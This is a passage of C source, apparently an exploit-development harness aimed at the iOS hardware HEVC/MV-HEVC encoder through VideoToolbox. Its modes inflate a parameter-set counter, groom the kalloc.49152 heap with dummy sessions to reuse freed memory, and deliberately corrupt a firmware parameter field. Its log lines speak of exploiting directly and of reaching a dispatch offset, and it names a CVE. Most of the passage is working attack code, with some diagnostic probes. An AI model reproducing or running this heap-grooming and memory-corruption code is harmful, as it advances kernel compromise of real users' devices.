            rlog("\nTest completed: %d encodes, %d errors, bytes_changed=%d\n",
                 encodes, errors, bytes_changed);

    } else if (strcmp(mode, "session_reuse") == 0) {
        rlog("SESSION_REUSE: Test kalloc_data memory reuse (stale counter attack)\n");
        rlog("Theory: if freed HEVC buffer memory isn't zeroed, a new session\n");
        rlog("inherits the old VPS counter value. If counter was 588 (196*3),\n");
        rlog("new entries start DIRECTLY in the crash zone on first encode.\n\n");
        rlog("This bypasses the 197-encode safe window entirely.\n\n");

        if (phase1_verify() != 0) goto done;

        int sr_lid = (argc > 2) ? (int)strtol(argv[2], NULL, 0) : 0xDEAD;
        int sr_rounds = (argc > 3) ? atoi(argv[3]) : 5;
        rlog("Session A layer_id=0x%x, %d reuse rounds\n\n", sr_lid, sr_rounds);

        /* Session A: encode 196 times (safe max) to inflate counter to ~588 */
        rlog("--- Session A: 196 encodes (counter inflation) ---\n");
        VTCompressionSessionRef sa = create_mvhevc_encoder(128, 128, sr_lid);
        if (!sa) { rlog("FAILED: Session A encoder creation\n"); goto done; }

        for (int i = 0; i < 196; i++) {
            int st = encode_one(sa, i, 128, 128);
            if (st != 0) { rlog("[A:%d] ENCODE ERROR: %d\n", i, st); break; }
            if ((i+1) % 50 == 0) rlog("[A:%d] ok, ~%d entries\n", i+1, (i+1)*3);
        }
        VTCompressionSessionCompleteFrames(sa, kCMTimeInvalid);
        usleep(200000);

        /* Record Session A's final pset state */
        size_t sa_psets = g_last_pset_count;
        size_t sa_bytes = g_last_pset_total_bytes;
        rlog("Session A final: pset_count=%zu, pset_bytes=%zu\n", sa_psets, sa_bytes);

        /* Free Session A — HEVC buffer goes back to kalloc */
        rlog("\nFreeing Session A (HEVC buffer returns to kalloc_data)...\n");
        VTCompressionSessionInvalidate(sa); CFRelease(sa);
        usleep(100000);

        /* Session B: allocate new encoder — may reuse same memory */
        for (int round = 0; round < sr_rounds; round++) {
            rlog("\n--- Session B (round %d/%d): testing for stale counter ---\n",
                 round+1, sr_rounds);
            VTCompressionSessionRef sb = create_mvhevc_encoder(128, 128, sr_lid);
            if (!sb) { rlog("FAILED: Session B encoder creation\n"); continue; }

            /* Encode just 1 frame and observe pset behavior */
            rlog("  Encoding 1 frame...\n");
            g_last_pset_count = 0;
            g_last_pset_total_bytes = 0;
            int st = encode_one(sb, 0, 128, 128);
            rlog("  Result: status=%d, pset_count=%zu, pset_bytes=%zu\n",
                 st, g_last_pset_count, g_last_pset_total_bytes);

            /* Compare with expected fresh-session values:
             * Fresh: pset_count=3 (VPS+SPS+PPS), small byte count
             * Stale counter: pset_count >> 3 (counter starts high, reads OOB entries)
             * Or: session creation crash (stale data causes fault) */
            if (g_last_pset_count > 10) {
                rlog("  *** STALE COUNTER DETECTED: pset_count=%zu >> 3 ***\n",
                     g_last_pset_count);
                rlog("  *** Session B counter started at stale value from Session A ***\n");
                rlog("  *** Memory NOT zeroed by kalloc_data! ***\n");
            } else if (g_last_pset_count <= 3 && st == 0) {
                rlog("  Normal: pset_count=%zu (fresh counter, memory likely zeroed)\n",
                     g_last_pset_count);
            }

            /* Encode 5 more frames to observe counter growth */
            rlog("  Encoding 5 more frames to observe counter...\n");
            for (int i = 1; i <= 5; i++) {
                st = encode_one(sb, i, 128, 128);
                rlog("    [B:%d] status=%d psets=%zu bytes=%zu\n",
                     i, st, g_last_pset_count, g_last_pset_total_bytes);
                if (st != 0) break;
            }
            VTCompressionSessionCompleteFrames(sb, kCMTimeInvalid);
            usleep(100000);

            /* Free session B for next round */
            VTCompressionSessionInvalidate(sb); CFRelease(sb);
            usleep(100000);
        }

        rlog("\nSession reuse test complete.\n");
        rlog("If stale counter detected: skip crash_test, exploit directly.\n");
        rlog("If memory zeroed: session reuse trick not viable.\n");

    } else if (strcmp(mode, "safe_corrupt") == 0) {
        rlog("SAFE_CORRUPT: Target +0x5C34 within safe window (196 encodes)\n");
        rlog("Entry 588 at byte 4 = layer_id field (secondary param array param[0])\n");
        rlog("This is the ONLY driver-referenced field reachable without crash.\n\n");

        if (phase1_verify() != 0) goto done;

        int sc_lid = (argc > 2) ? (int)strtol(argv[2], NULL, 0) : 0xFFFF;
        int sc_enc = (argc > 3) ? atoi(argv[3]) : 196;
        if (sc_enc > 197) { rlog("CLAMPED to 197 (crash boundary)\n"); sc_enc = 197; }
        rlog("layer_id=0x%x, encodes=%d\n\n", sc_lid, sc_enc);

        VTCompressionSessionRef s = create_mvhevc_encoder(128, 128, sc_lid);
        if (!s) { rlog("FAILED: encoder creation\n"); goto done; }

        /* Encode to safe limit — entry 588 reached at ~196 encodes */
        for (int i = 0; i < sc_enc; i++) {
            int st = encode_one(s, i, 128, 128);
            if (st != 0) { rlog("[%d] ENCODE ERROR: %d\n", i, st); break; }
            if ((i+1) == sc_enc || (i+1) % 50 == 0)
                rlog("[%d/%d] ok, ~%d entries, psets=%zu bytes=%zu\n",
                     i+1, sc_enc, (i+1)*3, g_last_pset_count, g_last_pset_total_bytes);
        }
        VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
        usleep(200000);

        rlog("\n--- Safe corruption applied ---\n");
        rlog("Entry 588 (+0x5C34) now contains layer_id=0x%x at byte 4\n", sc_lid);
        rlog("Secondary param array param[0] corrupted; params[1-6] intact.\n");
        rlog("If device is still alive: safe_corrupt is SURVIVABLE.\n");
        rlog("Next: encode 1 more frame to observe firmware behavior with corrupted param.\n\n");

        /* One more encode to trigger firmware param read with corrupted value */
        rlog("--- Extra encode (firmware reads corrupted +0x5C34) ---\n");
        int st = encode_one(s, sc_enc, 128, 128);
        rlog("Extra encode: status=%d\n", st);
        if (st == 0) {
            rlog("SURVIVED: firmware tolerates corrupted param[0]\n");
            rlog("Encode 2 more to confirm stability...\n");
            for (int i = 1; i <= 2; i++) {
                st = encode_one(s, sc_enc+i, 128, 128);
                rlog("  +%d: status=%d psets=%zu\n", i, st, g_last_pset_count);
                if (st != 0) break;
            }
        } else {
            rlog("CRASH/ERROR: firmware param corruption triggers fault at +0x5C34\n");
        }

        VTCompressionSessionInvalidate(s); CFRelease(s);

    } else if (strcmp(mode, "session_reuse_groom") == 0) {
        rlog("SESSION_REUSE_GROOM: Enhanced stale counter with heap grooming\n");
        rlog("Strategy: allocate N dummy sessions, free target, allocate reuse.\n");
        rlog("Goal: increase probability of LIFO slot reuse in kalloc.49152.\n\n");

        if (phase1_verify() != 0) goto done;

        int sr_lid = (argc > 2) ? (int)strtol(argv[2], NULL, 0) : 2;
        int sr_dummies = (argc > 3) ? atoi(argv[3]) : 3;
        rlog("layer_id=0x%x, dummy_sessions=%d\n\n", sr_lid, sr_dummies);

        /* Step 1: Create dummy sessions to fill kalloc.49152 free list */
        rlog("--- Step 1: Create %d dummy sessions (fill free list) ---\n", sr_dummies);
        VTCompressionSessionRef dummies[8];
        int n_dummies = (sr_dummies > 8) ? 8 : sr_dummies;
        for (int i = 0; i < n_dummies; i++) {
            dummies[i] = create_mvhevc_encoder(128, 128, 1);
            if (!dummies[i]) { rlog("Dummy %d: FAILED\n", i); n_dummies = i; break; }
            rlog("Dummy %d: created\n", i);
        }

        /* Step 2: Create target session and inflate counter */
        rlog("\n--- Step 2: Target session (196 encodes to inflate counter) ---\n");
        VTCompressionSessionRef target = create_mvhevc_encoder(128, 128, sr_lid);
        if (!target) { rlog("FAILED: target encoder creation\n"); goto cleanup_dummies; }

        for (int i = 0; i < 196; i++) {
            int st = encode_one(target, i, 128, 128);
            if (st != 0) { rlog("[%d] ENCODE ERROR: %d\n", i, st); break; }
            if ((i+1) % 50 == 0) rlog("[%d/196] ok\n", i+1);
        }
        VTCompressionSessionCompleteFrames(target, kCMTimeInvalid);
        usleep(200000);
        rlog("Target counter inflated to ~588\n");

        /* Step 3: Free target — its kalloc.49152 slot goes to free list (LIFO) */
        rlog("\n--- Step 3: Free target (most recent free → LIFO head) ---\n");
        VTCompressionSessionInvalidate(target); CFRelease(target);
        usleep(50000);

        /* Step 4: Create reuse session — should get the just-freed slot */
        rlog("\n--- Step 4: Create reuse session (should get stale slot) ---\n");
        VTCompressionSessionRef reuse = create_mvhevc_encoder(128, 128, sr_lid);
        if (!reuse) { rlog("FAILED: reuse encoder creation\n"); goto cleanup_dummies; }

        /* Step 5: Encode 1 frame and check for stale counter */
        g_last_pset_count = 0;
        g_last_pset_total_bytes = 0;
        int st = encode_one(reuse, 0, 128, 128);
        rlog("Reuse encode 1: status=%d, pset_count=%zu, pset_bytes=%zu\n",
             st, g_last_pset_count, g_last_pset_total_bytes);

        if (g_last_pset_count > 10) {
            rlog("\n*** STALE COUNTER DETECTED: pset_count=%zu >> 3 ***\n",
                 g_last_pset_count);
            rlog("*** HEAP GROOMING WORKED: kalloc_data reuse confirmed ***\n");
            rlog("*** Counter starts at ~588 → first encode hits crash zone ***\n");
            rlog("*** With lid=%d, +0x5F94 dispatch reachable in ~18 encodes ***\n", sr_lid);
        } else {
            rlog("Normal counter (memory zeroed or different slot). psets=%zu\n",
                 g_last_pset_count);
        }

        /* Encode a few more to observe */
        for (int i = 1; i <= 5; i++) {
            st = encode_one(reuse, i, 128, 128);
            rlog("  +%d: status=%d psets=%zu\n", i, st, g_last_pset_count);
            if (st != 0) break;
        }

        VTCompressionSessionInvalidate(reuse); CFRelease(reuse);

cleanup_dummies:
        rlog("\n--- Cleanup: freeing dummy sessions ---\n");
        for (int i = 0; i < n_dummies; i++) {
            if (dummies[i]) {
                VTCompressionSessionInvalidate(dummies[i]);
                CFRelease(dummies[i]);
            }
        }

    } else if (strcmp(mode, "diag") == 0) {
        rlog("DIAG: Hardware encoder diagnostics\n\n");

        /* Test 1: Standard HEVC (no MV-HEVC) */
        rlog("--- Test 1: Standard HEVC hardware encode ---\n");
        {
            CFMutableDictionaryRef es = CFDictionaryCreateMutable(
                NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
            CFDictionarySetValue(es, CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
            CFDictionarySetValue(es, CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
            VTCompressionSessionRef s1 = NULL;
            OSStatus r1 = VTCompressionSessionCreate(NULL, 128, 128,
                kCMVideoCodecType_HEVC, es, NULL, NULL, encode_cb, NULL, &s1);
            CFRelease(es);
            rlog("Create: %d, session=%p\n", (int)r1, (void*)s1);
            if (r1 == 0 && s1) {
                VTSessionSetProperty(s1, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
                int kf = 1;
                CFNumberRef kfn = CFNumberCreate(NULL, kCFNumberIntType, &kf);
                VTSessionSetProperty(s1, kVTCompressionPropertyKey_MaxKeyFrameInterval, kfn);
                CFRelease(kfn);
                OSStatus pr = VTCompressionSessionPrepareToEncodeFrames(s1);
                rlog("Prepare: %d\n", (int)pr);
                if (pr == 0) {
                    int r = encode_one(s1, 0, 128, 128);
                    rlog("Encode result: %d, cb_count=%d, pset=%zu\n", r, g_cb_count, g_last_pset_count);
                }
                VTCompressionSessionInvalidate(s1); CFRelease(s1);
            }
        }

        /* Test 2: MV-HEVC with layer_id=1 */
        rlog("\n--- Test 2: MV-HEVC hardware encode (layer_id=1) ---\n");
        {
            VTCompressionSessionRef s2 = create_mvhevc_encoder(128, 128, 1);
            rlog("Create MV-HEVC: session=%p\n", (void*)s2);
            if (s2) {
                g_cb_count = 0;
                int r = encode_one(s2, 0, 128, 128);
                rlog("Encode result: %d, cb_count=%d, pset=%zu\n", r, g_cb_count, g_last_pset_count);
                VTCompressionSessionInvalidate(s2); CFRelease(s2);
            }
        }

        /* Test 3: MV-HEVC with MVHEVCViewIDs (newer API) */
        rlog("\n--- Test 3: MV-HEVC with MVHEVCViewIDs property ---\n");
        {
            CFMutableDictionaryRef es = CFDictionaryCreateMutable(
                NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
            CFDictionarySetValue(es, CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
            CFDictionarySetValue(es, CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
            VTCompressionSessionRef s3 = NULL;
            OSStatus r3 = VTCompressionSessionCreate(NULL, 128, 128,
                kCMVideoCodecType_HEVC, es, NULL, NULL, encode_cb, NULL, &s3);
            CFRelease(es);
            rlog("Create: %d, session=%p\n", (int)r3, (void*)s3);
            if (r3 == 0 && s3) {
                VTSessionSetProperty(s3, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
                int kf = 1;
                CFNumberRef kfn = CFNumberCreate(NULL, kCFNumberIntType, &kf);
                VTSessionSetProperty(s3, kVTCompressionPropertyKey_MaxKeyFrameInterval, kfn);
                CFRelease(kfn);
                /* Try MVHEVCViewIDs instead of MVHEVCVideoLayerIDs */
                int v0 = 0, v1 = 1;
                CFNumberRef vids[2];
                vids[0] = CFNumberCreate(NULL, kCFNumberIntType, &v0);
                vids[1] = CFNumberCreate(NULL, kCFNumberIntType, &v1);
                CFArrayRef varr = CFArrayCreate(NULL, (const void **)vids, 2, &kCFTypeArrayCallBacks);
                OSStatus sp1 = VTSessionSetProperty(s3, CFSTR("MVHEVCViewIDs"), varr);
                rlog("MVHEVCViewIDs: %d\n", (int)sp1);
                CFRelease(varr); CFRelease(vids[0]); CFRelease(vids[1]);
                /* Also set left/right eye */
                CFNumberRef l = CFNumberCreate(NULL, kCFNumberIntType, &v0);
                CFNumberRef r = CFNumberCreate(NULL, kCFNumberIntType, &v1);
                OSStatus sp2 = VTSessionSetProperty(s3, CFSTR("MVHEVCLeftAndRightViewIDs"), varr);
                rlog("MVHEVCLeftAndRightViewIDs: %d (may not exist)\n", (int)sp2);
                CFRelease(l); CFRelease(r);

                OSStatus pr = VTCompressionSessionPrepareToEncodeFrames(s3);
                rlog("Prepare: %d\n", (int)pr);
                if (pr == 0) {
                    g_cb_count = 0;
                    int enc = encode_one(s3, 0, 128, 128);
                    rlog("Encode result: %d, cb_count=%d, pset=%zu\n",
                         enc, g_cb_count, g_last_pset_count);
                }
                VTCompressionSessionInvalidate(s3); CFRelease(s3);
            }
        }

        /* Test 4: Check supported properties */
        rlog("\n--- Test 4: Property support check ---\n");
        {
            VTCompressionSessionRef s4 = create_mvhevc_encoder(128, 128, 1);
            if (s4) {
                CFDictionaryRef props = NULL;
                OSStatus ps = VTSessionCopySupportedPropertyDictionary(s4, &props);
                rlog("CopySupportedPropertyDictionary: %d\n", (int)ps);
                if (ps == 0 && props) {
                    CFIndex cnt = CFDictionaryGetCount(props);
                    rlog("Total supported properties: %ld\n", (long)cnt);
                    /* Check for MV-HEVC specific keys */
                    const char *mv_keys[] = {
                        "MVHEVCVideoLayerIDs", "MVHEVCLeftEyeID", "MVHEVCRightEyeID",
                        "MVHEVCViewIDs", "HasLeftStereoEyeView", "HasRightStereoEyeView",
                        "HeroEye", "StereoCameraBaseline", NULL
                    };
                    for (int i = 0; mv_keys[i]; i++) {
                        CFStringRef k = CFStringCreateWithCString(NULL, mv_keys[i], kCFStringEncodingUTF8);
                        Boolean has = CFDictionaryContainsKey(props, k);
                        rlog("  %s: %s\n", mv_keys[i], has ? "YES" : "no");
                        CFRelease(k);
                    }
                    CFRelease(props);
                }
                VTCompressionSessionInvalidate(s4); CFRelease(s4);
            }
        }

    } else if (strcmp(mode, "hevc_overflow") == 0) {
        rlog("HEVC_OVERFLOW: Standard HEVC encoder with 100 encodes\n");
        rlog("Tests if standard HEVC hits the same VPS table counter overflow\n\n");
        CFMutableDictionaryRef es = CFDictionaryCreateMutable(
            NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
        CFDictionarySetValue(es, CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
        CFDictionarySetValue(es, CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
        VTCompressionSessionRef s = NULL;
        OSStatus r = VTCompressionSessionCreate(NULL, 128, 128,
            kCMVideoCodecType_HEVC, es, NULL, NULL, encode_cb, NULL, &s);
        CFRelease(es);
        rlog("Create: %d\n", (int)r);
        if (r == 0 && s) {
            VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
            int kf = 1;
            CFNumberRef kfn = CFNumberCreate(NULL, kCFNumberIntType, &kf);
            VTSessionSetProperty(s, kVTCompressionPropertyKey_MaxKeyFrameInterval, kfn);
            CFRelease(kfn);
            VTSessionSetProperty(s, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanFalse);
            OSStatus pr = VTCompressionSessionPrepareToEncodeFrames(s);
            rlog("Prepare: %d\n", (int)pr);
            int errors = 0;
            for (int i = 0; i < 100 && pr == 0; i++) {
                int st = encode_one(s, i, 128, 128);
                if (st != 0) {
                    rlog("[%d] ERROR: %d\n", i, st);
                    errors++;
                    if (errors > 3) break;
                } else if (i % 10 == 0 || i >= 85) {
                    rlog("[%d] ok, pset=%zu, bytes=%zu, cb_count=%d\n",
                         i, g_last_pset_count, g_last_pset_total_bytes, g_cb_count);
                }
            }
            VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
            rlog("Done: %d encodes, %d errors, cb_count=%d\n", 100, errors, g_cb_count);
            VTCompressionSessionInvalidate(s); CFRelease(s);
        }

    } else if (strcmp(mode, "diag2") == 0) {
        rlog("DIAG2: MV-HEVC with only MVHEVCVideoLayerIDs (no eye IDs)\n\n");
        CFMutableDictionaryRef es = CFDictionaryCreateMutable(
            NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
        CFDictionarySetValue(es, CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
        CFDictionarySetValue(es, CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
        VTCompressionSessionRef s = NULL;
        OSStatus r = VTCompressionSessionCreate(NULL, 128, 128,
            kCMVideoCodecType_HEVC, es, NULL, NULL, encode_cb, NULL, &s);
        CFRelease(es);
        rlog("Create: %d\n", (int)r);
        if (r == 0 && s) {
            VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
            int kf = 1;
            CFNumberRef kfn = CFNumberCreate(NULL, kCFNumberIntType, &kf);
            VTSessionSetProperty(s, kVTCompressionPropertyKey_MaxKeyFrameInterval, kfn);
            CFRelease(kfn);
            VTSessionSetProperty(s, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanFalse);

            /* Only MVHEVCVideoLayerIDs — no eye IDs */
            int b = 0, lid = 1;
            CFNumberRef i0 = CFNumberCreate(NULL, kCFNumberIntType, &b);
            CFNumberRef i1 = CFNumberCreate(NULL, kCFNumberIntType, &lid);
            CFArrayRef a = CFArrayCreate(NULL, (const void *[]){i0, i1}, 2, &kCFTypeArrayCallBacks);
            OSStatus sp = VTSessionSetProperty(s, CFSTR("MVHEVCVideoLayerIDs"), a);
            rlog("MVHEVCVideoLayerIDs: %d\n", (int)sp);
            CFRelease(a); CFRelease(i0); CFRelease(i1);

            OSStatus pr = VTCompressionSessionPrepareToEncodeFrames(s);
            rlog("Prepare: %d\n", (int)pr);
            if (pr == 0) {
                g_cb_count = 0;
                int enc = encode_one(s, 0, 128, 128);
                rlog("Test A (LayerIDs only): status=%d, cb=%d, pset=%zu\n",
                     enc, g_cb_count, g_last_pset_count);
            }
            VTCompressionSessionInvalidate(s); CFRelease(s);
        }

        /* Test B: MVHEVCViewIDs only */
        rlog("\n--- Test B: MVHEVCViewIDs only ---\n");
        es = CFDictionaryCreateMutable(
            NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
        CFDictionarySetValue(es, CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
        CFDictionarySetValue(es, CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
        s = NULL;
        r = VTCompressionSessionCreate(NULL, 128, 128,
            kCMVideoCodecType_HEVC, es, NULL, NULL, encode_cb, NULL, &s);
        CFRelease(es);
        rlog("Create: %d\n", (int)r);
        if (r == 0 && s) {
            VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
            int kf = 1;
            CFNumberRef kfn = CFNumberCreate(NULL, kCFNumberIntType, &kf);
            VTSessionSetProperty(s, kVTCompressionPropertyKey_MaxKeyFrameInterval, kfn);
            CFRelease(kfn);

            int b = 0, lid = 1;
            CFNumberRef i0 = CFNumberCreate(NULL, kCFNumberIntType, &b);
            CFNumberRef i1 = CFNumberCreate(NULL, kCFNumberIntType, &lid);
            CFArrayRef a = CFArrayCreate(NULL, (const void *[]){i0, i1}, 2, &kCFTypeArrayCallBacks);
            OSStatus sp = VTSessionSetProperty(s, CFSTR("MVHEVCViewIDs"), a);
            rlog("MVHEVCViewIDs: %d\n", (int)sp);
            CFRelease(a); CFRelease(i0); CFRelease(i1);

            OSStatus pr = VTCompressionSessionPrepareToEncodeFrames(s);
            rlog("Prepare: %d\n", (int)pr);
            if (pr == 0) {
                g_cb_count = 0;
                int enc = encode_one(s, 0, 128, 128);
                rlog("Test B (ViewIDs only): status=%d, cb=%d, pset=%zu\n",
                     enc, g_cb_count, g_last_pset_count);
            }
            VTCompressionSessionInvalidate(s); CFRelease(s);
        }

        /* Test C: Both MVHEVCVideoLayerIDs + MVHEVCViewIDs */
        rlog("\n--- Test C: Both LayerIDs + ViewIDs ---\n");
        es = CFDictionaryCreateMutable(
            NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
        CFDictionarySetValue(es, CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
        CFDictionarySetValue(es, CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
        s = NULL;
        r = VTCompressionSessionCreate(NULL, 128, 128,
            kCMVideoCodecType_HEVC, es, NULL, NULL, encode_cb, NULL, &s);
        CFRelease(es);
        rlog("Create: %d\n", (int)r);
        if (r == 0 && s) {
            VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
            int kf = 1;
            CFNumberRef kfn = CFNumberCreate(NULL, kCFNumberIntType, &kf);
            VTSessionSetProperty(s, kVTCompressionPropertyKey_MaxKeyFrameInterval, kfn);
            CFRelease(kfn);

            int b = 0, lid = 1;
            CFNumberRef i0 = CFNumberCreate(NULL, kCFNumberIntType, &b);
            CFNumberRef i1 = CFNumberCreate(NULL, kCFNumberIntType, &lid);
            CFArrayRef a = CFArrayCreate(NULL, (const void *[]){i0, i1}, 2, &kCFTypeArrayCallBacks);
            VTSessionSetProperty(s, CFSTR("MVHEVCVideoLayerIDs"), a);
            OSStatus sp = VTSessionSetProperty(s, CFSTR("MVHEVCViewIDs"), a);
            rlog("MVHEVCViewIDs (with LayerIDs): %d\n", (int)sp);
            CFRelease(a); CFRelease(i0); CFRelease(i1);

            OSStatus pr = VTCompressionSessionPrepareToEncodeFrames(s);
            rlog("Prepare: %d\n", (int)pr);
            if (pr == 0) {
                g_cb_count = 0;
                int enc = encode_one(s, 0, 128, 128);
                rlog("Test C (Both): status=%d, cb=%d, pset=%zu\n",
                     enc, g_cb_count, g_last_pset_count);
            }
            VTCompressionSessionInvalidate(s); CFRelease(s);
        }

    } else if (strcmp(mode, "diag3") == 0) {
        rlog("DIAG3: MV-HEVC Multi-Image Encode (CMTaggedBufferGroup)\n");
        rlog("Tests the CORRECT API for stereo MV-HEVC encoding\n\n");

        /* Test 0: Check VTIsStereoMVHEVCEncodeSupported */
        rlog("--- Test 0: VTIsStereoMVHEVCEncodeSupported() ---\n");
        extern Boolean VTIsStereoMVHEVCEncodeSupported(void)
            __attribute__((weak_import));
        if (VTIsStereoMVHEVCEncodeSupported) {
            Boolean sup = VTIsStereoMVHEVCEncodeSupported();
            rlog("VTIsStereoMVHEVCEncodeSupported = %s\n", sup ? "YES" : "NO");
            if (!sup) {
                rlog("FATAL: Device does NOT support stereo MV-HEVC encoding\n");
                rlog("This means CVE-2026-114025 MV-HEVC path is NOT available\n");
                goto done;
            }
        } else {
            rlog("VTIsStereoMVHEVCEncodeSupported not linked (pre-iOS 17?)\n");
        }

        /* Test 1: Create session with MVHEVCVideoLayerIDs + MVHEVCViewIDs,
           then use VTCompressionSessionEncodeMultiImageFrame with tagged buffers */
        rlog("\n--- Test 1: EncodeMultiImageFrame with CMTaggedBufferGroup ---\n");
        {
            CFMutableDictionaryRef es = CFDictionaryCreateMutable(
                NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
            CFDictionarySetValue(es, CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
            CFDictionarySetValue(es, CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
            VTCompressionSessionRef s = NULL;
            OSStatus r = VTCompressionSessionCreate(NULL, 128, 128,
                kCMVideoCodecType_HEVC, es, NULL, NULL, encode_cb, NULL, &s);
            CFRelease(es);
            rlog("Create session: %d\n", (int)r);
            if (r != 0 || !s) { rlog("FAILED to create session\n"); goto done; }

            VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
            int kf = 1;
            CFNumberRef kfn = CFNumberCreate(NULL, kCFNumberIntType, &kf);
            VTSessionSetProperty(s, kVTCompressionPropertyKey_MaxKeyFrameInterval, kfn);
            CFRelease(kfn);
            VTSessionSetProperty(s, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanFalse);

            /* Set MVHEVCVideoLayerIDs = [0, 1] */
            int v0 = 0, v1 = 1;
            CFNumberRef n0 = CFNumberCreate(NULL, kCFNumberIntType, &v0);
            CFNumberRef n1 = CFNumberCreate(NULL, kCFNumberIntType, &v1);
            CFArrayRef ids = CFArrayCreate(NULL, (const void *[]){n0, n1}, 2, &kCFTypeArrayCallBacks);
            OSStatus sp1 = VTSessionSetProperty(s, CFSTR("MVHEVCVideoLayerIDs"), ids);
            rlog("MVHEVCVideoLayerIDs [0,1]: %d\n", (int)sp1);

            /* Set MVHEVCViewIDs = [0, 1] */
            OSStatus sp2 = VTSessionSetProperty(s, CFSTR("MVHEVCViewIDs"), ids);
            rlog("MVHEVCViewIDs [0,1]: %d\n", (int)sp2);

            /* Try HasLeftStereoEyeView / HasRightStereoEyeView */
            OSStatus sp3 = VTSessionSetProperty(s, CFSTR("HasLeftStereoEyeView"), kCFBooleanTrue);
            OSStatus sp4 = VTSessionSetProperty(s, CFSTR("HasRightStereoEyeView"), kCFBooleanTrue);
            rlog("HasLeftStereoEyeView: %d, HasRightStereoEyeView: %d\n", (int)sp3, (int)sp4);

            CFRelease(ids); CFRelease(n0); CFRelease(n1);

            OSStatus pr = VTCompressionSessionPrepareToEncodeFrames(s);
            rlog("Prepare: %d\n", (int)pr);
            if (pr != 0) {
                rlog("FAILED: PrepareToEncodeFrames = %d\n", (int)pr);
                VTCompressionSessionInvalidate(s); CFRelease(s);
                goto done;
            }

            /* Create two pixel buffers: left eye and right eye */
            CVPixelBufferRef pb_left = create_pb(128, 128);
            CVPixelBufferRef pb_right = create_pb(128, 128);
            if (!pb_left || !pb_right) {
                rlog("FAILED: Could not create pixel buffers\n");
                if (pb_left) CVPixelBufferRelease(pb_left);
                if (pb_right) CVPixelBufferRelease(pb_right);
                VTCompressionSessionInvalidate(s); CFRelease(s);
                goto done;
            }

            /* Fill right eye with different pattern for distinguishability */
            CVPixelBufferLockBaseAddress(pb_right, 0);
            void *rbase = CVPixelBufferGetBaseAddress(pb_right);
            if (rbase) memset(rbase, 0x84, 128 * 128 * 4);
            CVPixelBufferUnlockBaseAddress(pb_right, 0);

            /* Build CMTaggedBufferGroup with two tagged pixel buffers.
               Left eye: stereoView=leftEye, videoLayerID=0
               Right eye: stereoView=rightEye, videoLayerID=1 */

            /* Use pre-built stereo eye tags + video layer ID tags.
               kCMTagStereoLeftEye / kCMTagStereoRightEye are pre-made CMTag constants.
               Video layer IDs are built with CMTagMakeWithSInt64Value. */
            CMTag tag_layer_0 = CMTagMakeWithSInt64Value(
                kCMTagCategory_VideoLayerID, 0);
            CMTag left_tags[2] = { kCMTagStereoLeftEye, tag_layer_0 };
            CMTagCollectionRef left_tc = NULL;
            OSStatus tc1 = CMTagCollectionCreate(NULL, left_tags, 2, &left_tc);
            rlog("Left tag collection create: %d\n", (int)tc1);

            CMTag tag_layer_1 = CMTagMakeWithSInt64Value(
                kCMTagCategory_VideoLayerID, 1);
            CMTag right_tags[2] = { kCMTagStereoRightEye, tag_layer_1 };
            CMTagCollectionRef right_tc = NULL;
            OSStatus tc2 = CMTagCollectionCreate(NULL, right_tags, 2, &right_tc);
            rlog("Right tag collection create: %d\n", (int)tc2);

            if (tc1 != 0 || tc2 != 0) {
                rlog("FAILED: Could not create tag collections\n");
                if (left_tc) CFRelease(left_tc);
                if (right_tc) CFRelease(right_tc);
                CVPixelBufferRelease(pb_left);
                CVPixelBufferRelease(pb_right);
                VTCompressionSessionInvalidate(s); CFRelease(s);
                goto done;
            }

            /* Create CMTaggedBufferGroup from two pixel buffers + tag collections */
            CMTagCollectionRef tag_colls[2] = { left_tc, right_tc };
            CVPixelBufferRef pbs[2] = { pb_left, pb_right };

            /* CMTaggedBufferGroupCreate(allocator, tagCollections, buffers, count, out) */
            CMTaggedBufferGroupRef tbg = NULL;
            CFArrayRef tc_arr = CFArrayCreate(NULL, (const void **)tag_colls, 2,
                &kCFTypeArrayCallBacks);
            CFArrayRef pb_arr = CFArrayCreate(NULL, (const void **)pbs, 2,
                &kCFTypeArrayCallBacks);
            OSStatus tbg_st = CMTaggedBufferGroupCreate(NULL, tc_arr, pb_arr, &tbg);
